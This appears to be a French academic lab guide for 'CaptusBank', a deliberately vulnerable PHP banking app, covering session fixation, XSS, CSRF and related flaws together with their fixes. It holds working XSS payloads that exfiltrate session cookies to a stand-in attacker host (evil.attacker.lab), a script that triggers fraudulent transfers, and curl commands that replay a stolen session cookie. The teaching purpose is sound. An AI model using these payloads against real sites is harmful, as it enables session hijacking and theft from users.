# CaptusBank — Guide Complet
## Projet Ethical Hacking — Session Fixation & XSS

---

# TABLE DES MATIÈRES

1. [Architecture du projet](#1-architecture-du-projet)
2. [Cours — Les vulnérabilités expliquées](#2-cours--les-vulnérabilités-expliquées)
   - 2.1 Session Fixation
   - 2.2 XSS Stocké
   - 2.3 XSS Réfléchi
   - 2.4 CSRF
   - 2.5 Mots de passe en clair
   - 2.6 Cookies sans HttpOnly
   - 2.7 Information Disclosure
3. [Comment fonctionne l'application](#3-comment-fonctionne-lapplication)
4. [Le dashboard de l'attaquant](#4-le-dashboard-de-lattaquant)
5. [Démos pas à pas](#5-démos-pas-à-pas)

---

# 1. Architecture du projet

## Vue d'ensemble

Le projet simule un vrai environnement d'attaque avec trois acteurs distincts, chacun dans son propre conteneur Docker :

```
┌─────────────────────────────────────────────────────────┐
│                    Nginx (port 8080)                     │
│              Reverse proxy — route par hostname          │
└──────────┬──────────────────┬───────────────────┬───────┘
           │                  │                   │
           ▼                  ▼                   ▼
  ┌──────────────┐   ┌──────────────┐   ┌──────────────────┐
  │  app-vuln    │   │  app-secure  │   │ attacker-server  │
  │ PHP 8.2      │   │ PHP 8.2      │   │ PHP 8.2          │
  │ Apache       │   │ Apache       │   │ Apache           │
  │              │   │              │   │                  │
  │ vuln.bank    │   │ secure.bank  │   │ evil.attacker    │
  │ .local:8080  │   │ .local:8080  │   │ .lab:8080        │
  └──────┬───────┘   └──────┬───────┘   └────────┬─────────┘
         │                  │                    │
         └──────────┬───────┘                    │
                    ▼                            ▼
           ┌──────────────┐             ┌──────────────┐
           │    MySQL     │             │   SQLite     │
           │  bank_vuln   │             │  stolen_     │
           │  bank_secure │             │  sessions    │
           └──────────────┘             └──────────────┘
```

## Les services

| Service | Hostname | Port | Rôle |
|---|---|---|---|
| `app-vulnerable` | `vuln.bank.local` | 8080 | Application bancaire **intentionnellement vulnérable** |
| `app-secure` | `secure.bank.local` | 8080 | Version **corrigée** avec toutes les contre-mesures |
| `attacker-server` | `evil.attacker.lab` | 8080 | Serveur C2 de l'attaquant — dashboard + collecte des cookies |
| `mysql` | interne | 3307 | Base de données partagée (deux schémas : `bank_vuln` et `bank_secure`) |
| `nginx` | — | 8080 | Reverse proxy qui route selon le header `Host` |

## Les comptes de test

| Utilisateur | Mot de passe | Rôle | Solde |
|---|---|---|---|
| `alice` | `Password123!` | Victime | 12 450 € |
| `bob` | `BobPass456!` | Utilisateur secondaire | 3 200 € |
| `mallory` | `EvilPass1!` | Attaquant | 5 € |
| `admin_honeypot` | `D0_n0t_use!` | Honeypot | — |

## Les pages de l'application vulnérable

| Page | URL | Accès | Description |
|---|---|---|---|
| Login | `/login.php` | Public | Authentification — contient le SID en clair + XSS réfléchi |
| Dashboard | `/dashboard.php` | Authentifié | Solde + historique des virements — XSS dans les notes |
| Virement | `/transfer.php` | Authentifié | Formulaire de virement — pas de token CSRF |
| Commentaires | `/comments.php` | Authentifié | Forum — XSS stocké, vecteur principal |
| Profil | `/profile.php` | Authentifié | Modification du nom — XSS stocké |
| Logout | `/logout.php` | Authentifié | Déconnexion |

---

# 2. Cours — Les vulnérabilités expliquées

---

## 2.1 Session Fixation (CWE-384)

### Qu'est-ce qu'une session ?

Quand un utilisateur se connecte à un site web, le serveur crée une **session** — un espace mémoire côté serveur qui stocke les informations de l'utilisateur (qui il est, ses droits, son panier...). Pour retrouver cette session à chaque requête, le serveur attribue un identifiant unique appelé **Session ID (SID)** qui est transmis via un cookie.

```
Navigateur                          Serveur
   │                                   │
   │── GET /login.php ────────────────►│
   │◄─ Set-Cookie: PHPSESSID=abc123 ──│  ← serveur crée une session
   │                                   │
   │── POST /login.php ───────────────►│
   │   Cookie: PHPSESSID=abc123        │  ← client renvoie le SID
   │◄─ 302 /dashboard.php ────────────│  ← serveur associe abc123 à l'utilisateur
```

### La vulnérabilité

La **session fixation** exploite le fait que certains serveurs acceptent un SID **imposé par le client** via l'URL (`?PHPSESSID=...`) ou un cookie, et surtout qu'ils **ne changent pas** ce SID après l'authentification.

L'attaquant peut donc :
1. Choisir un SID arbitraire
2. Forcer la victime à utiliser ce SID (phishing, XSS...)
3. Attendre que la victime se connecte
4. Utiliser ce même SID pour accéder au compte de la victime

### Pourquoi ça marche sur l'app vulnérable ?

Deux paramètres PHP critiques sont mal configurés :

```ini
session.use_strict_mode = 0   ; PHP accepte n'importe quel SID fourni par le client
session.use_only_cookies = 0  ; PHP accepte le SID via l'URL (?PHPSESSID=...)
session.use_trans_sid = 1     ; PHP propage le SID dans les liens et formulaires
```

Et dans `login.php`, il manque cette ligne cruciale après l'authentification :
```php
// ❌ ABSENT dans la version vulnérable
session_regenerate_id(true);
```

Sans cette ligne, le SID reste identique avant et après la connexion. C'est la faille fondamentale.

### La contre-mesure

Dans l'application sécurisée, trois protections combinées rendent l'attaque impossible :

```ini
session.use_strict_mode = 1   ; PHP rejette tout SID inconnu du serveur
session.use_only_cookies = 1  ; PHP n'accepte JAMAIS le SID via URL
```

```php
// ✅ PRÉSENT dans la version sécurisée — login.php
if ($user && password_verify($password, $user['password_hash'])) {
    session_regenerate_id(true); // ← nouveau SID généré, l'ancien est détruit
    $_SESSION['user_id'] = $user['id'];
    // ...
}
```

Même si l'attaquant a réussi à imposer un SID à la victime, après le `session_regenerate_id(true)` ce SID devient inutilisable — la victime possède maintenant un SID entièrement nouveau que l'attaquant ne connaît pas.

---

## 2.2 XSS Stocké — Cross-Site Scripting (CWE-79)

### Principe

Le **Cross-Site Scripting (XSS)** permet d'injecter du code JavaScript malveillant dans une page web. Quand une victime visite cette page, le script s'exécute dans son navigateur avec ses privilèges — comme si c'était du JavaScript légitime du site.

Le XSS **stocké** (ou persistant) est la forme la plus dangereuse : le payload est sauvegardé dans la base de données et s'exécute pour **tous les visiteurs** de la page.

### Pourquoi ça marche sur l'app vulnérable ?

Dans `comments.php`, le contenu des commentaires est affiché sans aucun traitement :

```php
// ❌ VULNÉRABLE — comments.php
<div class="body"><?= $r['content'] ?></div>
```

Si un commentaire contient `<script>alert(1)</script>`, le navigateur l'exécute comme du JavaScript.

La même vulnérabilité existe dans `dashboard.php` pour les notes de virement :
```php
// ❌ VULNÉRABLE — dashboard.php
<td><?= $tx['note'] ?></td>
```

Et dans `profile.php` pour le nom complet :
```php
// ❌ VULNÉRABLE — profile.php
<h2>Profil de <?= $user['full_name'] ?></h2>
```

### Usages dans notre attaque

Le XSS stocké sert ici à deux fins combinées :

**1. Fixer le cookie de session (vecteur de fixation)**
```javascript
document.cookie = "PHPSESSID=ATTACKERfixedSID001; path=/";
```

**2. Exfiltrer le cookie vers le serveur attaquant (confirmation)**
```javascript
new Image().src = "http://evil.attacker.lab:8080/collect.php"
           + "?sid=ATTACKERfixedSID001"
           + "&c=" + encodeURIComponent(document.cookie);
```

**3. Exécuter un virement frauduleux (CSRF via XSS)**
```javascript
var f = new FormData();
f.append('to_iban', 'FR7630001007940000000000042');
f.append('amount', '999');
fetch('/transfer.php', {method:'POST', credentials:'include', body:f});
```

### La contre-mesure

Une seule fonction PHP suffit pour neutraliser le XSS : `htmlspecialchars()`.

```php
// ✅ SÉCURISÉ — app-secure/comments.php
<div class="body"><?= htmlspecialchars($r['content'], ENT_QUOTES, 'UTF-8') ?></div>
```

Cette fonction convertit les caractères dangereux :
- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `'` → `&#039;`
- `&` → `&amp;`

Résultat : `<script>alert(1)</script>` est affiché comme du texte et non exécuté.

En complément, l'app sécurisée ajoute une **Content Security Policy (CSP)** :
```
Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'self'
```

Cette directive HTTP interdit l'exécution de tout JavaScript qui ne vient pas du domaine lui-même — même si un XSS passait à travers l'échappement, le navigateur refuserait de l'exécuter.

---

## 2.3 XSS Réfléchi (CWE-79)

### Différence avec le XSS stocké

Le XSS **réfléchi** n'est pas stocké en base de données. Il est injecté directement dans l'URL et "réfléchi" par le serveur dans sa réponse HTML. La victime doit cliquer sur un lien malveillant pour que le payload s'exécute.

### La vulnérabilité dans l'app

Dans `login.php`, le paramètre `?msg=` est injecté directement dans le HTML :

```php
// ❌ VULNÉRABLE — login.php
<?php if (isset($_GET['msg'])): ?>
    <div class="notice"><?= $_GET['msg'] ?></div>
<?php endif; ?>
```

### Exploitation

L'attaquant envoie à la victime un lien comme :
```
http://vuln.bank.local:8080/login.php?msg=<script>document.location='http://evil.attacker.lab:8080/collect.php?c='+document.cookie</script>
```

La victime clique, son cookie est volé et envoyé à l'attaquant.

### La contre-mesure

```php
// ✅ SÉCURISÉ
<div class="notice"><?= htmlspecialchars($_GET['msg'], ENT_QUOTES, 'UTF-8') ?></div>
```

---

## 2.4 CSRF — Cross-Site Request Forgery (CWE-352)

### Principe

Le **CSRF** force le navigateur d'une victime authentifiée à envoyer des requêtes non désirées vers un site où elle est connectée. Le navigateur inclut automatiquement les cookies (session) dans toutes les requêtes, même celles déclenchées depuis un autre site.

### La vulnérabilité dans l'app

Le formulaire de virement n'a aucun token de vérification :

```php
// ❌ VULNÉRABLE — transfer.php
<form method="post">
    <input type="text" name="to_iban">
    <input type="number" name="amount">
    <!-- PAS DE TOKEN CSRF -->
    <button type="submit">Valider</button>
</form>
```

### Exploitation via XSS (contourne SameSite)

Les navigateurs modernes appliquent `SameSite=Lax` par défaut, ce qui bloque les POST cross-origin depuis un fichier local. La meilleure façon de démontrer le CSRF ici est via le XSS — le script s'exécute **depuis le domaine de la banque**, donc les cookies sont inclus :

```javascript
// Payload XSS dans comments.php qui effectue un virement CSRF
var f = new FormData();
f.append('to_iban', 'FR7630001007940000000000042');
f.append('amount', '999');
f.append('note', 'CSRF via XSS - invisible');
fetch('/transfer.php', {method: 'POST', credentials: 'include', body: f});
```

Quand Alice visite `comments.php`, le virement est exécuté silencieusement.

### La contre-mesure

L'application sécurisée génère un token CSRF unique par session, vérifié à chaque soumission :

```php
// ✅ SÉCURISÉ — génération du token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// ✅ Dans le formulaire
<input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">

// ✅ Vérification côté serveur
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
    die('CSRF détecté — requête rejetée');
}
```

Le token est lié à la session — un attaquant qui ne peut pas lire la page (même domaine) ne peut pas le connaître.

---

## 2.5 Mots de passe en clair (CWE-256)

### La vulnérabilité

Dans la version vulnérable, les mots de passe sont stockés **en clair** dans la base de données :

```sql
-- bank_vuln.users
alice   | Password123!
bob     | BobPass456!
mallory | EvilPass1!
```

En cas de fuite de la base de données (injection SQL, dump...), tous les comptes sont immédiatement compromis. La même règle s'applique à tous les sites où ces utilisateurs réutilisent leurs mots de passe.

### La contre-mesure

L'application sécurisée stocke uniquement le **hash bcrypt** du mot de passe :

```sql
-- bank_secure.users
alice   | $2y$10$z3SoQMU/h4WgOweUV8Z42e...
bob     | $2y$10$PJrrCTGixREX/k/6v4aQ8...
mallory | $2y$10$YsSuIFtbB4KmMT4hv5fK7...
```

```php
// ✅ Hachage à la création (bootstrap_passwords.php)
$hash = password_hash($plaintext_password, PASSWORD_BCRYPT, ['cost' => 12]);

// ✅ Vérification à la connexion (login.php)
if ($user && password_verify($password, $user['password_hash'])) {
    // authentification réussie
}
```

bcrypt est intentionnellement lent (coût configurable) ce qui rend le brute-force extrêmement coûteux même avec la DB en main.

---

## 2.6 Cookies sans HttpOnly ni Secure (CWE-1004)

### La vulnérabilité

Dans la version vulnérable, le cookie de session est accessible via JavaScript :

```ini
; PHP ini — app-vulnerable
session.cookie_httponly = 0  ; JS peut lire document.cookie
session.cookie_secure   = 0  ; cookie envoyé en HTTP (non chiffré)
session.cookie_samesite = ""  ; pas de restriction cross-site
```

Résultat dans la console DevTools :
```javascript
document.cookie
// → "PHPSESSID=ATTACKERfixedSID001"
```

N'importe quel XSS peut exfiltrer la session complète.

### La contre-mesure

```ini
; PHP ini — app-secure
session.cookie_httponly = 1  ; JS ne peut PAS lire le cookie
session.cookie_secure   = 1  ; cookie uniquement sur HTTPS
session.cookie_samesite = Strict  ; bloque l'envoi cross-site
```

Avec `HttpOnly`, même si un XSS passe, `document.cookie` retourne une chaîne vide — le cookie est invisible au JavaScript.

---

## 2.7 Information Disclosure (CWE-200)

### La vulnérabilité

L'application vulnérable révèle des informations sensibles qui aident l'attaquant :

**Dans chaque réponse HTTP :**
```
X-Powered-By: PHP/8.2.31
```

**Dans le HTML de toutes les pages :**
```html
<!-- login.php -->
SID actuel (pré-auth) : <code>ATTACKERfixedSID001</code>

<!-- dashboard.php -->
Session ID courant : <code>ATTACKERfixedSID001</code>
```

Ces informations permettent à l'attaquant de :
- Connaître la version de PHP (cibler des CVE spécifiques)
- **Confirmer visuellement** que la session fixation a fonctionné
- Voir le SID en temps réel sans DevTools

### La contre-mesure

```ini
expose_php = Off          ; supprime X-Powered-By
display_errors = Off      ; pas d'erreurs PHP en production
```

Et suppression de tout affichage du SID dans le HTML.

---

# 3. Comment fonctionne l'application

## Flux d'une session PHP (côté serveur)

La session n'est pas stockée dans un fichier mais **en base de données MySQL**, ce qui permet de prouver visuellement le partage de session entre attaquant et victime.

Le `DbSessionHandler` dans `session_handler.php` implémente l'interface PHP `SessionHandlerInterface` :

| Méthode | Action |
|---|---|
| `read($sid)` | `SELECT payload FROM sessions WHERE sid = ?` |
| `write($sid, $data)` | `INSERT ... ON DUPLICATE KEY UPDATE` (upsert) |
| `destroy($sid)` | `DELETE FROM sessions WHERE sid = ?` |
| `gc($max)` | Supprime les sessions expirées |

La table `sessions` contient :
```
sid              | SID de la session
user_id          | NULL si non authentifié, sinon l'ID de l'utilisateur
ip_address       | IP du client
user_agent       | User-Agent du navigateur
payload          | Données sérialisées ($_SESSION)
last_seen        | Dernière activité
```

**C'est cette table qui permet de prouver le hijack** : après l'attaque, on voit une seule ligne avec le SID de l'attaquant et le `user_id` de la victime.

## Configuration PHP volontairement vulnérable

```ini
session.use_strict_mode  = 0  ; accepte les SID inconnus
session.use_only_cookies = 0  ; accepte le SID via URL
session.use_trans_sid    = 1  ; propage le SID dans les liens/formulaires
session.cookie_httponly  = 0  ; cookie lisible par JS
session.cookie_secure    = 0  ; cookie envoyé en HTTP
session.cookie_samesite  = "" ; aucune restriction cross-site
display_errors           = On ; affiche les erreurs PHP
expose_php               = On ; révèle la version PHP
```

---

# 4. Le dashboard de l'attaquant

## Accès

```
http://evil.attacker.lab:8080
```

## Ce qu'il contient

### Section "Payloads prêts à l'emploi"

Le dashboard affiche trois vecteurs d'attaque pré-configurés :
- **Vecteur A** — Lien de fixation via URL
- **Vecteur B** — Payload XSS stocké (cookie overwrite + beacon)
- **Vecteur C** — Exfiltration directe du cookie via image beacon

### Section "Sessions interceptées"

Tableau mis à jour en temps réel (polling AJAX toutes les 2 secondes) qui affiche chaque beacon reçu :

| Colonne | Contenu |
|---|---|
| Quand | Timestamp de réception |
| SID | Le session ID exfiltré |
| Cookie complet | Tout le contenu de `document.cookie` |
| Méthode | `stored-xss`, `url`, etc. |
| URL victime | La page où le XSS s'est déclenché |
| IP | IP du navigateur de la victime |
| UA | User-Agent du navigateur |

## Comment ça fonctionne techniquement

Quand le payload XSS s'exécute dans le navigateur d'Alice :
```javascript
new Image().src = "http://evil.attacker.lab:8080/collect.php"
           + "?sid=ATTACKERfixedSID001"
           + "&c=" + encodeURIComponent(document.cookie);
```

`collect.php` reçoit la requête, la loge dans SQLite, et retourne un GIF 1×1 transparent pour rester discret. Le dashboard JS récupère les entrées via `/api.php` toutes les 2 secondes et met à jour le tableau.

---

# 5. Démos pas à pas

> **Prérequis** : Stack Docker démarrée, hostnames dans `/etc/hosts`, base de données propre.
>
> **Comptes** : Alice = `alice / Password123!` | Mallory = `mallory / EvilPass1!`
>
> **SID attaquant** : `ATTACKERfixedSID001` (sans underscore — PHP n'accepte que `[A-Za-z0-9-,]`)

---

## DEMO 0 — Réinitialiser l'environnement

Avant chaque série de démos, nettoyer la base :

```powershell
docker exec p03-mysql mysql -uroot -prootpass -e "
USE bank_vuln;
DELETE FROM sessions;
DELETE FROM transfers;
DELETE FROM comments;
INSERT INTO comments (user_id, content) VALUES
    (1, 'Bienvenue sur CaptusBank !'),
    (2, 'Service très efficace, je recommande.');
UPDATE accounts SET balance = 12450.00 WHERE user_id = 1;
UPDATE accounts SET balance = 3200.50  WHERE user_id = 2;
UPDATE accounts SET balance = 5.00     WHERE user_id = 3;
"
```

---

## DEMO 1A — Session Fixation via URL (phishing)

> **Faille démontrée** : `session.use_only_cookies=0` + `session.use_trans_sid=1` + absence de `session_regenerate_id()`
>
> **Prérequis** : Alice n'a JAMAIS visité le site dans sa fenêtre (aucun cookie existant)
>
> **Acteurs** : fenêtre privée = Mallory | fenêtre normale fraîche = Alice

---

### Étape 1 — Mallory enregistre le SID en base

Dans la **fenêtre privée**, ouvre :
```
http://vuln.bank.local:8080/login.php?PHPSESSID=ATTACKERfixedSID001
```

La page affiche en bas : **SID actuel (pré-auth) : `ATTACKERfixedSID001`**

Le serveur a accepté le SID choisi par Mallory. Un cookie est posé. Connecte-toi avec `mallory / EvilPass1!` → le dashboard s'affiche, le SID n'a pas changé :
```
Session ID courant : ATTACKERfixedSID001
```
En DB : `ATTACKERfixedSID001 → user_id=3 (Mallory)`

Déconnecte Mallory (logout). Laisse la fenêtre privée ouverte.

---

### Étape 2 — Alice clique le lien piégé

Dans une **fenêtre normale qui n'a jamais visité le site**, ouvre directement :
```
http://vuln.bank.local:8080/login.php?PHPSESSID=ATTACKERfixedSID001
```

La page affiche : **SID actuel (pré-auth) : `ATTACKERfixedSID001`**

PHP a accepté le SID de l'URL car `use_only_cookies=0`. Alice a maintenant ce cookie dans son navigateur sans le savoir.

---

### Étape 3 — Alice se connecte normalement

Connecte-toi avec `alice / Password123!`. Le dashboard d'Alice s'affiche. Regarde le SID :
```
Session ID courant : ATTACKERfixedSID001
```

**Le SID n'a PAS changé après le login** — c'est le bug central. En DB :
```
ATTACKERfixedSID001 → user_id=1 (Alice)
```

---

### Étape 4 — Mallory utilise le SID volé

Dans la **fenêtre privée de Mallory** (cookie `ATTACKERfixedSID001` toujours présent), va sur :
```
http://vuln.bank.local:8080/dashboard.php
```

**Le compte d'Alice s'affiche — 12 450 €.** Mallory n'a jamais eu le mot de passe d'Alice.

---

### Étape 5 — Preuve en base de données

```powershell
docker exec p03-mysql mysql -uroot -prootpass -e "SELECT sid, user_id, ip_address, last_seen FROM bank_vuln.sessions;"
```

Un seul SID, partagé par deux personnes différentes.

---

### Étape 6 — L'app sécurisée résiste

```
http://secure.bank.local:8080/login.php?PHPSESSID=ATTACKERfixedSID001
```

`session.use_strict_mode=1` rejette ce SID inconnu, un nouveau est généré. Et même si le SID passait, `session_regenerate_id(true)` au login en créerait un nouveau. L'attaque échoue aux deux étapes.

---

## DEMO 1B — Session Fixation via XSS stocké (sans phishing)

> **Faille démontrée** : XSS stocké qui écrase le cookie de session + absence de `session_regenerate_id()`
>
> **Différence clé avec 1A** : Alice n'a besoin de cliquer sur AUCUN lien suspect. Elle utilise le site normalement. C'est le XSS qui lui impose le SID à son insu.
>
> **Acteurs** : fenêtre privée = Mallory | fenêtre normale = Alice (peut avoir visité le site avant)

---

### Pourquoi ça marche sans phishing

Quand Alice visite `comments.php` en étant connectée, le XSS de Mallory s'exécute dans son navigateur et écrase son cookie avec `ATTACKERfixedSID001`. Sa session active devient invalide — elle est redirigée vers le login. Elle pense que sa session a expiré, se reconnecte normalement, et sans le savoir elle authentifie le SID de Mallory.

```
Alice connectée (SID_ALICE)
        │
        ▼
Visite comments.php
        │
        ▼
XSS s'exécute → cookie devient ATTACKERfixedSID001
        │
        ▼
Page suivante → session vide → redirigé vers login
        │
        ▼
Alice se reconnecte → DB: ATTACKERfixedSID001 → user_id=1
        │
        ▼
Mallory utilise ATTACKERfixedSID001 → compte d'Alice ✓
```

---

### Étape 1 — Mallory enregistre le SID et plante le XSS

Dans la **fenêtre privée**, ouvre :
```
http://vuln.bank.local:8080/login.php?PHPSESSID=ATTACKERfixedSID001
```

Connecte-toi avec `mallory / EvilPass1!`. Va sur `comments.php` et poste ce commentaire :

```html
<script>
document.cookie="PHPSESSID=ATTACKERfixedSID001; path=/";
new Image().src="http://evil.attacker.lab:8080/collect.php?m=stored-xss&sid=ATTACKERfixedSID001&c="+encodeURIComponent(document.cookie);
window.location.href='/login.php?msg=Session expirée. Veuillez vous reconnecter.';
</script>
```
```html
<script>document.cookie="PHPSESSID=ATTACKERfixedSID001; path=/";new Image().src="http://evil.attacker.lab:8080/collect.php?m=stored-xss&sid=ATTACKERfixedSID001&c="+encodeURIComponent(document.cookie)+"&url="+encodeURIComponent(location.href);</script>
```
```html
<script>
var f = new FormData();
f.append('to_iban', 'FR7630001007940000000000042');
f.append('amount', '999');
f.append('note', 'Transfert automatique');
fetch('/transfer.php', {method:'POST', credentials:'include', body:f})
  .then(function(){
    new Image().src='http://evil.attacker.lab:8080/collect.php?m=csrf-done&sid=done';
  });
</script>
```
Ce script fait deux choses :
1. Écrase le cookie PHPSESSID avec `ATTACKERfixedSID001`
2. Redirige vers le login avec un faux message d'erreur — Alice ne suspecte rien

**Déconnecte Mallory** (logout). Laisse la fenêtre privée ouverte.

---

### Étape 2 — Alice utilise le site normalement

Dans une **fenêtre normale** (Alice peut avoir déjà visité le site), connecte-toi avec `alice / Password123!`. Alice est sur son dashboard avec **son propre SID** :
```
Session ID courant : (un SID aléatoire quelconque)
```

En DB : `SID_ALICE → user_id=1`

---

### Étape 3 — Alice visite les commentaires (le XSS frappe)

Alice va sur `http://vuln.bank.local:8080/comments.php`.

Le script XSS s'exécute **silencieusement** :
- Son cookie devient `ATTACKERfixedSID001`
- Elle est redirigée vers `/login.php?msg=Session expirée. Veuillez vous reconnecter.`

Alice voit ce message totalement banal et se reconnecte avec `alice / Password123!`.

---

### Étape 4 — La fixation est complète

Alice arrive sur son dashboard. Son SID affiché :
```
Session ID courant : ATTACKERfixedSID001
```

En DB :
```
ATTACKERfixedSID001 → user_id=1 (Alice)
```

Alice a authentifié le SID de Mallory sans jamais avoir cliqué un lien suspect.

---

### Étape 5 — Mallory hijacke

Dans la **fenêtre privée de Mallory**, va sur :
```
http://vuln.bank.local:8080/dashboard.php
```

**Compte d'Alice — 12 450 €.** Hijack réussi sans phishing.

---

### Virement frauduleux (optionnel pour les deux démos)

Depuis la fenêtre de Mallory connecté en Alice :
- IBAN : `FR7630001007940000000000042`
- Montant : `9999`
- Note : `Virement autorisé`

---

## DEMO 2 — XSS Réfléchi

**Aucune connexion requise.** Dans n'importe quel navigateur :

```
http://vuln.bank.local:8080/login.php?msg=<script>alert('XSS réfléchi !')</script>
```

Une popup apparaît. Montrer ensuite le code source de la page (`Ctrl+U`) — le script est injecté tel quel dans le HTML sans encodage.

**Variante plus impactante — vol de cookie :**
```
http://vuln.bank.local:8080/login.php?msg=<script>document.location='http://evil.attacker.lab:8080/collect.php?c='+document.cookie</script>
```

---

## DEMO 3 — XSS Stocké via note de virement

Connecté en tant qu'Alice (ou n'importe quel compte) :

1. Va sur `http://vuln.bank.local:8080/transfer.php`
2. IBAN : `FR7630001007940000000000042`
3. Montant : `1`
4. Note :
```html
<img src=x onerror="alert('XSS dans virement! User: '+document.cookie)">
```
5. Valide → retourne sur le dashboard

La popup s'affiche à chaque chargement du dashboard, pour tous les utilisateurs connectés.

---

## DEMO 4 — XSS Stocké via profil

Connecté en tant qu'Alice :

1. Va sur `http://vuln.bank.local:8080/profile.php`
2. Nom complet :
```html
<script>document.body.innerHTML='<h1 style="color:red;font-size:72px">HACKED BY MALLORY</h1>'</script>
```
3. Sauvegarde

La page profil et le header sont défacés. Sur l'app sécurisée, le texte s'affiche littéralement (échappé).

---

## DEMO 5 — Cookies lisibles (absence de HttpOnly)

Connecté en tant qu'Alice sur `vuln.bank.local`, ouvrir DevTools → Console :

```javascript
document.cookie
// Résultat : "PHPSESSID=ATTACKERfixedSID001"
```

Puis la même commande sur `secure.bank.local` :
```javascript
document.cookie
// Résultat : ""  ← HttpOnly, invisible au JS
```

Puis inspecter dans DevTools → Application → Cookies :
- Vuln : `HttpOnly` = vide, `Secure` = vide, `SameSite` = vide
- Secure : `HttpOnly` = ✓, `Secure` = ✓, `SameSite` = Strict

---

## DEMO 6 — Mots de passe en clair vs hashés

```powershell
# Version vulnérable — mots de passe en clair
docker exec p03-mysql mysql -uroot -prootpass -e "SELECT username, password FROM bank_vuln.users;"

# Version sécurisée — bcrypt
docker exec p03-mysql mysql -uroot -prootpass -e "SELECT username, password_hash FROM bank_secure.users;"
```

Résultat vulnérable :
```
alice   | Password123!
bob     | BobPass456!
mallory | EvilPass1!
```

Résultat sécurisé :
```
alice   | $2y$10$z3SoQMU/h4WgOweUV8Z42e...
bob     | $2y$10$PJrrCTGixREX/k/6v4aQ8...
```

En cas de fuite DB, les mots de passe en clair sont exploitables immédiatement. Avec bcrypt, chaque hash prend plusieurs secondes à tester — brute-force pratiquement impossible.

---

## DEMO 7 — CSRF (Cross-Site Request Forgery)

> **Faille démontrée** : absence de token CSRF dans `transfer.php` — le serveur accepte n'importe quelle requête POST avec un cookie valide, sans vérifier d'où elle vient.
>
> **Différence avec XSS** : ici la requête vient d'un **outil externe** (curl), pas d'un script injecté dans la page. On prouve que le serveur ne vérifie pas l'origine de la requête.

---

### Ce qu'est vraiment le CSRF

La faille CSRF c'est que `transfer.php` n'a **aucun token de vérification**. N'importe quelle requête POST avec un cookie valide est exécutée, qu'elle vienne du navigateur d'Alice, d'un script, ou d'un outil tiers.

```php
// ❌ transfer.php — aucune vérification d'origine
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $to     = $_POST['to_iban'];
    $amount = $_POST['amount'];
    // → virement exécuté sans vérifier si la requête vient bien du site
}
```

---

### Étape 1 — Alice est connectée, récupérer son SID

Alice est connectée avec `ATTACKERfixedSID001` (depuis la Demo 1A ou 1B). Le SID est visible sur le dashboard.

---

### Étape 2 — Mallory exécute un virement depuis son terminal

Mallory n'est pas dans le navigateur d'Alice. Il utilise curl pour envoyer une requête cross-origin avec le cookie volé :

```powershell
curl -s -X POST "http://vuln.bank.local:8080/transfer.php" `
  -H "Host: vuln.bank.local" `
  -H "Cookie: PHPSESSID=ATTACKERfixedSID001" `
  -d "to_iban=FR7630001007940000000000042&amount=500&note=CSRF demo"
```

Le serveur exécute le virement — il ne vérifie pas que la requête vient du bon endroit.

---

### Étape 3 — Vérifier le virement en DB

```powershell
docker exec p03-mysql mysql -uroot -prootpass -e "SELECT balance FROM bank_vuln.accounts WHERE user_id=1;"
```

Le solde d'Alice a diminué de 500 € sans qu'elle ait rien fait.

---

### Étape 4 — L'app sécurisée rejette la requête

```powershell
curl -s -X POST "http://secure.bank.local:8080/transfer.php" `
  -H "Host: secure.bank.local" `
  -H "Cookie: PHPSESSID=ATTACKERfixedSID001" `
  -d "to_iban=FR7630001007940000000000042&amount=500&note=CSRF demo"
```

La requête est rejetée — le token CSRF manque dans le POST, le serveur refuse.

---

### Réinitialiser le solde après la démo

```powershell
docker exec p03-mysql mysql -uroot -prootpass -e "UPDATE bank_vuln.accounts SET balance=12450.00 WHERE user_id=1;"
```

---

## DEMO 8 — Information Disclosure

Dans DevTools → Network → n'importe quelle requête → Response Headers :

**App vulnérable :**
```
X-Powered-By: PHP/8.2.31
```

**App sécurisée :**
```
(absent)
```

Dans le code source de `login.php` (vulnérable) :
```html
SID actuel (pré-auth) : <code>ATTACKERfixedSID001</code>
```

Cette information a permis à l'attaquant de **confirmer en temps réel** que le SID était bien accepté par le serveur lors de la phase de reconnaissance.

---

# Récapitulatif des vulnérabilités

| # | Vulnérabilité | OWASP | CWE | Fichier vulnérable | Correction |
|---|---|---|---|---|---|
| 1 | Session Fixation | A07 — Auth Failures | CWE-384 | `session_handler.php`, `login.php` | `session_regenerate_id(true)` + `use_strict_mode=1` |
| 2 | XSS Stocké | A03 — Injection | CWE-79 | `comments.php`, `dashboard.php`, `profile.php` | `htmlspecialchars()` + CSP |
| 3 | XSS Réfléchi | A03 — Injection | CWE-79 | `login.php` | `htmlspecialchars()` |
| 4 | CSRF | A01 — Broken Access | CWE-352 | `transfer.php` | Token CSRF + `SameSite=Strict` |
| 5 | Mots de passe en clair | A02 — Crypto Failures | CWE-256 | `01-schema.sql` | `password_hash()` bcrypt |
| 6 | Cookie sans HttpOnly | A05 — Misconfig | CWE-1004 | `session_handler.php` | `cookie_httponly=1` |
| 7 | Information Disclosure | A05 — Misconfig | CWE-200 | Toutes les pages | `expose_php=Off` + supprimer SID du HTML |

---

*Projet réalisé dans un cadre académique — environnement isolé Docker. Ne jamais reproduire sur des systèmes sans autorisation explicite.*
